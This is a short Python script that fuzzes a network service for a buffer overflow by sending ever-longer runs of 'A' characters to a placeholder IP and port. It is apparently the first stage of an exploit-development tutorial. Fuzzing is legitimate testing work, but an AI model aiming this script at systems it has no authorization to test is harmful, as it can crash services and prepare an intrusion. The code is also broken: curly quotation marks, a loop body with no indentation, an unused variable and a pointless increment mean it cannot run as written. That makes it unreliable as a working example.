#!/usr/bin/python
import time, socket
# Create a string, fuzz from ilength (initial length) to tlength
# (target length), with increments of 500 (increment).
buffer=”A”
ilength=100
tlength=2000
increment=500


for x in range(increment,tlength,increment):
print(“Fuzzing with %s bytes” % x)
buffer = “A”*x
print(buffer)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect((‘IP’,PORT)) # Change to target 
time.sleep(1)
s.send(buffer + “\r\n”);
s.close()

x += increment
